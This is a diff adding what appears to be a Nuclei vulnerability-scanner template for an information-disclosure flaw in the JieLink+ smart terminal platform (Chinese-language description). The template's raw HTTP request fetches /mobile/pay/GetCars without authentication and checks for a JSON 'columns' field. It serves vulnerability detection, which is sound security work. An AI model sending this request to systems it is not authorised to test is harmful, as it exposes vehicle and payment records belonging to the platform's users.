@@ -1,0 +1,28 @@
+id: JieLink-Information-disclosure
+
+info:
+  name: JieLink智能终端操作平台信息泄露
+  author: unknown
+  severity: medium
+  description: JieLink+智能终端操作平台存在信息泄露，攻击者可利用该漏洞获取敏感信息。
+  tags: Information disclosure
+  
+http:
+  - raw:
+      - |
+        GET /mobile/pay/GetCars?pageIndex=1&pageSize=100 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"columns":'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
